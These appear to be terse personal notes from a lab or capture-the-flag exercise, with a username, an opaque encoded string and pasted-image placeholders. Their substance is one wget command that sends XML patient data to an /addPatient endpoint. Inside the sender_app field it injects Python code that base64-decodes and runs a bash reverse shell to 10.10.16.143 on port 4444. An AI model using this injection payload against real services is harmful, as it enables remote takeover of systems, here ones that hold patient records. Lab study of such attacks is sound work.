sedric
u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==

![[Pasted image 20260225001140.png]]


![[Pasted image 20260225001120.png]]

![[Pasted image 20260225001102.png]]


wget -qO- --server-response \ --method=POST \ --header='Content-Type: application/xml' \ --body-data='<?xml version="1.0" encoding="UTF-8"?><patient><firstname>John</firstname><lastname>Doe</lastname><sender_app>{__import__("os").popen(__import__("base64").b64decode("YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xNDMvNDQ0NCAwPiYxIg==").decode()).read()}</sender_app><timestamp>20230601T120000</timestamp><birth_date>01/01/1990</birth_date><gender>M</gender></patient>' \ http://127.0.0.1:54321/addPatient


![[Pasted image 20260225111104.png]]

